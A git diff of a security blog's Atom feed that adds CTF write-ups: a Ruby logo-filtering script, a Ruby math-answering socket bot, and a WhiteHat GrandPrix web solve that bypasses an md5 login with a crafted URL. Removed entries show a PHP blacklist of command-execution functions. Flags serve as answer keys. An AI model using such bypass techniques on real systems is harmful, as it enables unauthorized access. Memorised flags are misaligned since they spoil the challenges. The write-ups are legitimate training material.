class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</div></pre></td></tr></table></figure></p>
+<p>Let's write a very short ruby script to filter that:</p>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">logo = open(<span class="string">"logo.txt"</span>, <span class="string">'r'</span>).read()</div><div class="line"><span class="comment">#flag = logo.gsub(/[^a-zA-Z0-9&#123;&#125;_]/, '')</span></div><div class="line">flag = logo.gsub(<span class="regexp">/[#@.;:+,`'\s]/</span>, <span class="string">''</span>)</div><div class="line">puts flag</div></pre></td></tr></table></figure></p>
+<p>Flag: <code>ALEXCTF{0UR_L0G0_R0CKS}</code></p>
+<h2 id="100-sc1-math-bot-scripting">100 - SC1: Math bot - Scripting</h2>
+<blockquote>
+<p>It is well known that computers can do tedious math faster than human.</p>
+<p>nc 195.154.53.62 1337</p>
+<p>Update</p>
+<p>we got another mirror here</p>
+<p>nc 195.154.53.62 7331</p>
+</blockquote>
+<p>The server send some calculations with big integers and we have to solve a lot of them.</p>
+<p>To do that I did a ruby bot:</p>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"></div><div class="line">hostname = <span class="string">'195.154.53.62'</span></div><div class="line">port = <span class="number">1337</span></div><div class="line"></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line"></div><div class="line">raw = <span class="string">''</span></div><div class="line">res = <span class="literal">nil</span></div><div class="line">flag = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/=$/</span>) &amp;&amp; flag == <span class="literal">false</span></div><div class="line">        calc = raw.match(<span class="regexp">/^([0-9]*) ([+\-%*\/]) ([0-9]*) =/</span>)</div><div class="line">        a = calc.captures[<span class="number">0</span>].to_i</div><div class="line">        oper = calc.captures[<span class="number">1</span>]</div><div class="line">        b = calc.captures[<span class="number">2</span>].to_i</div><div class="line">        <span class="keyword">if</span> oper == <span class="string">'+'</span></div><div class="line">            res = a + b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'-'</span></div><div class="line">            res = a - b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'*'</span></div><div class="line">            res = a * b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'%'</span></div><div class="line">            res = a % b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'/'</span></div><div class="line">            res = a / b</div><div class="line">        <span class="keyword">else</span></div><div class="line">            puts <span class="string">"That's not good..."</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">if</span> res != <span class="literal">nil</span></div><div class="line">            puts res</div><div class="line">            s.puts res</div><div class="line">        <span class="keyword">end</span></div><div class="line">        res = <span class="literal">nil</span></div><div class="line">        raw = <span class="string">''</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure></p>
+<p><em>Note</em>: I chose not to use some exec function because I don't trust external entries.</p>
+<p>Here an example of output and the flag:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">                __________</div><div class="line">         ______/ ________ \______</div><div class="line">       _/      ____________      \_</div><div class="line">     _/____________    ____________\_</div><div class="line">    /  ___________ \  / ___________  \</div><div class="line">   /  /XXXXXXXXXXX\ \/ /XXXXXXXXXXX\  \</div><div class="line">  /  /############/    \############\  \</div><div class="line">  |  \XXXXXXXXXXX/ _  _ \XXXXXXXXXXX/  |</div><div class="line">__|\_____   ___   //  \\   ___   _____/|__</div><div class="line">[_       \     \  X    X  /     /       _]</div><div class="line">__|     \ \                    / /     |__</div><div class="line">[____  \ \ \   ____________   / / /  ____]</div><div class="line">     \  \ \ \/||.||.||.||.||\/ / /  /</div><div class="line">      \_ \ \  ||.||.||.||.||  / / _/</div><div class="line">        \ \   ||.||.||.||.||   / /</div><div class="line">         \_   ||_||_||_||_||   _/</div><div class="line">           \     ........     /</div><div class="line">            \________________/</div><div class="line"></div><div class="line">Our system system has detected human traffic from your IP!</div><div class="line">Please prove you are a bot</div><div class="line">Question  1 :</div><div class="line">188284398378183198274310077338361 - 222311858895894501436877647952618 =</div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">Question  250 :</div><div class="line">198932319558549559940672382195244 % 276981013309967153730940955239195 =</div><div class="line">Well no human got time to solve 500 ridiculous math challenges</div><div class="line">Congrats MR bot!</div><div class="line">Tell your human operator flag is: ALEXCTF&#123;1_4M_l33t_b0t&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
   </entry>
   
@@ -1864,6 +2226,98 @@ So I had to run my script several and have the luck not to search for ambiguous 
   </entry>
   
   <entry>
+    <title>WhiteHat GrandPrix - 100 - Banh bot loc - Web</title>
+    <link href="https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/"/>
+    <id>https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/</id>
+    <published>2016-12-16T23:00:00.000Z</published>
+    <updated>2017-02-07T18:23:36.722Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
+<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
+</ul>
+<h3 id="description">Description</h3>
+<blockquote>
+<p><a href="http://web05.grandprix.whitehatvn.com" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com</a></p>
+<p><a href="http://bakweb05.grandprix.whitehatvn.com:8125" target="_blank" rel="external">http://bakweb05.grandprix.whitehatvn.com:8125</a></p>
+</blockquote>
+<h2 id="solution">Solution</h2>
+<p>Here is the home page:</p>
+<p><img src="http://i.imgur.com/r2BGme3.png" alt=""></p>
+<p>The login link go to <code>http://web05.grandprix.whitehatvn.com/index.php?username=guest&amp;password=guest</code> and says <code>noob</code>.</p>
+<p><img src="http://i.imgur.com/w7FZJ9a.png" alt=""></p>
+<p>Let's see source code of teh web page:</p>
+<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'index.php?username=guest&amp;password=guest'</span>&gt;</span>login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>Login to get our secret<span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- index.php.bak --&gt;</span></div></pre></td></tr></table></figure></p>
+<p>Ok, let's see <code>index.php.bak</code>:</p>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checklogin</span><span class="params">($username, $password, $key, $secret)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>($username.$key == md5($password))</div><div class="line">		<span class="keyword">echo</span> $secret;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"noob"</span>;</div><div class="line">    &#125;</div><div class="line">$key = <span class="string">"1337"</span>;</div><div class="line">$secret = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;html&gt;</span></div><div class="line">    &lt;title&gt;hello&lt;/title&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    &lt;a href='index.php?username=guest&amp;password=guest'&gt;login&lt;/a&gt;&lt;br&gt;</div><div class="line">    &lt;/body&gt;";</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</div><div class="line">    &#123;</div><div class="line">        checklogin($_GET[<span class="string">'username'</span>],$_GET[<span class="string">'password'</span>],$key,$secret);</div><div class="line">        <span class="keyword">die</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Login to get our secret"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/html&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>Ok so the login checks that the concatenation of the username and the key is equal to the md5 hash of the password.</p>
+<p>So we need to find a hash like <code>????????????????????????????1337</code> (28 random hex chars and 1337).</p>
+<p>I first thought to download a md5 hash dictionary but I didn't wanted to wait during teh download.</p>
+<p>So I went to <a href="https://md5db.net/explore/0000" target="_blank" rel="external">md5db.net</a> and looked for a hash beginning with <code>0000</code>, did a <code>CTRL + F</code> to find <code>1337</code> and finaly found <a href="https://md5db.net/view/0000dd456d15560290351cb4e6311337" target="_blank" rel="external">one</a>: <strong>#</strong> <em>13381</em> <strong>Hash</strong> <em>0000dd456d15560290351cb4e6311337</em> <strong>Word</strong> <em>hdtfz</em>.</p>
+<p>So we get:</p>
+<ul>
+<li>username: <code>0000dd456d15560290351cb4e631</code></li>
+<li>key: <code>1337</code></li>
+<li>password: <code>hdtfz</code></li>
+</ul>
+<p>I submited the url: <a href="http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz</a> and got the flag <code>WhiteHat{92ab818618fee438a1ea3944b5940237975f2b1d}</code>.</p>
+<p><img src="http://i.imgur.com/YxrFXdq.png" alt=""></p>
+<h2 id="submit">Submit</h2>
+<p><img src="http://i.imgur.com/aFTxLvH.jpg" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
     <title>WhiteHat GrandPrix - 100 - Banh da Ke - Misc</title>
     <link href="https://rawsec.ml/en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/"/>
     <id>https://rawsec.ml/en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/</id>
@@ -2217,322 +2671,6 @@ So I had to run my script several and have the luck not to search for ambiguous 
 <p><img src="http://i.imgur.com/N6ZHerV.png" alt=""></p>
 <p>This is for the <em>Discovering Vietnam</em> bonus challenge. It is a puzzle of 23 parts, you need them to get a QR-code that give a flag. Flag will give 10% bonus points of the current score.</p>
 <p>I think we need to do almost all challenges to get all the pieces.</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
-    
-      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WhiteHat GrandPrix - 100 - Banh bot loc - Web</title>
-    <link href="https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/"/>
-    <id>https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-bot-loc/</id>
-    <published>2016-12-16T23:00:00.000Z</published>
-    <updated>2017-02-07T18:23:36.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
-<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="description">Description</h3>
-<blockquote>
-<p><a href="http://web05.grandprix.whitehatvn.com" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com</a></p>
-<p><a href="http://bakweb05.grandprix.whitehatvn.com:8125" target="_blank" rel="external">http://bakweb05.grandprix.whitehatvn.com:8125</a></p>
-</blockquote>
-<h2 id="solution">Solution</h2>
-<p>Here is the home page:</p>
-<p><img src="http://i.imgur.com/r2BGme3.png" alt=""></p>
-<p>The login link go to <code>http://web05.grandprix.whitehatvn.com/index.php?username=guest&amp;password=guest</code> and says <code>noob</code>.</p>
-<p><img src="http://i.imgur.com/w7FZJ9a.png" alt=""></p>
-<p>Let's see source code of teh web page:</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'index.php?username=guest&amp;password=guest'</span>&gt;</span>login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>Login to get our secret<span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- index.php.bak --&gt;</span></div></pre></td></tr></table></figure></p>
-<p>Ok, let's see <code>index.php.bak</code>:</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checklogin</span><span class="params">($username, $password, $key, $secret)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>($username.$key == md5($password))</div><div class="line">		<span class="keyword">echo</span> $secret;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"noob"</span>;</div><div class="line">    &#125;</div><div class="line">$key = <span class="string">"1337"</span>;</div><div class="line">$secret = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;html&gt;</span></div><div class="line">    &lt;title&gt;hello&lt;/title&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    &lt;a href='index.php?username=guest&amp;password=guest'&gt;login&lt;/a&gt;&lt;br&gt;</div><div class="line">    &lt;/body&gt;";</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</div><div class="line">    &#123;</div><div class="line">        checklogin($_GET[<span class="string">'username'</span>],$_GET[<span class="string">'password'</span>],$key,$secret);</div><div class="line">        <span class="keyword">die</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Login to get our secret"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/html&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>Ok so the login checks that the concatenation of the username and the key is equal to the md5 hash of the password.</p>
-<p>So we need to find a hash like <code>????????????????????????????1337</code> (28 random hex chars and 1337).</p>
-<p>I first thought to download a md5 hash dictionary but I didn't wanted to wait during teh download.</p>
-<p>So I went to <a href="https://md5db.net/explore/0000" target="_blank" rel="external">md5db.net</a> and looked for a hash beginning with <code>0000</code>, did a <code>CTRL + F</code> to find <code>1337</code> and finaly found <a href="https://md5db.net/view/0000dd456d15560290351cb4e6311337" target="_blank" rel="external">one</a>: <strong>#</strong> <em>13381</em> <strong>Hash</strong> <em>0000dd456d15560290351cb4e6311337</em> <strong>Word</strong> <em>hdtfz</em>.</p>
-<p>So we get:</p>
-<ul>
-<li>username: <code>0000dd456d15560290351cb4e631</code></li>
-<li>key: <code>1337</code></li>
-<li>password: <code>hdtfz</code></li>
-</ul>
-<p>I submited the url: <a href="http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz" target="_blank" rel="external">http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz</a> and got the flag <code>WhiteHat{92ab818618fee438a1ea3944b5940237975f2b1d}</code>.</p>
-<p><img src="http://i.imgur.com/YxrFXdq.png" alt=""></p>
-<h2 id="submit">Submit</h2>
-<p><img src="http://i.imgur.com/aFTxLvH.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WhiteHat GrandPrix - 100 - Banh can - Web</title>
-    <link href="https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/"/>
-    <id>https://rawsec.ml/en/WhiteHat-GrandPrix-2016-web-100-banh-can/</id>
-    <published>2016-12-16T23:00:00.000Z</published>
-    <updated>2017-02-07T18:23:36.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
-<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="description">Description</h3>
-<blockquote>
-<p><a href="http://web04.grandprix.whitehatvn.com" target="_blank" rel="external">http://web04.grandprix.whitehatvn.com</a></p>
-<p><a href="http://bakweb04.grandprix.whitehatvn.com:8118" target="_blank" rel="external">http://bakweb04.grandprix.whitehatvn.com:8118</a></p>
-<p>Powered by People Security Academic - PSA</p>
-</blockquote>
-<h2 id="solution">Solution</h2>
-<p><strong>TL;DR</strong>: Incomplete write-up.</p>
-<p>Here is the home page:</p>
-<p><img src="http://i.imgur.com/OZw8nP1.png" alt=""></p>
-<p>Check the source code:</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">What's your name? I just want to say hello :)</div><div class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"hello"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- function hint() --&gt;</span></div></pre></td></tr></table></figure></p>
-<p>So let's try the hint function: <code>http://web04.grandprix.whitehatvn.com/?hint=</code>.</p>
-<p><img src="http://i.imgur.com/kJVzdOH.png" alt=""></p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$blacklist = <span class="keyword">array</span>(<span class="string">"system"</span>, <span class="string">"passthru"</span>, <span class="string">"exec"</span>, <span class="string">"read"</span>, <span class="string">"open"</span>, <span class="string">"eval"</span>, <span class="string">"backtick"</span>, <span class="string">"`"</span>, <span class="string">"_"</span>);</div><div class="line"></div><div class="line"><span class="keyword">die</span>(<span class="string">"No no no hackers!!"</span>);</div></pre></td></tr></table></figure></p>
-<h2 id="submit">Submit</h2>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>OpenSUSE : change ssh port / use a cutom ssh port</title>
-    <link href="https://rawsec.ml/en/opensuse-change-ssh-port/"/>
-    <id>https://rawsec.ml/en/opensuse-change-ssh-port/</id>
-    <published>2016-12-13T23:00:00.000Z</published>
-    <updated>2017-02-07T18:23:36.882Z</updated>
-    
-    <content type="html"><![CDATA[<p>For this exemple, our custom ssh port will be <strong>52222</strong>.</p>
-<p>Edit <code>/etc/ssh/sshd_config</code>:</p>
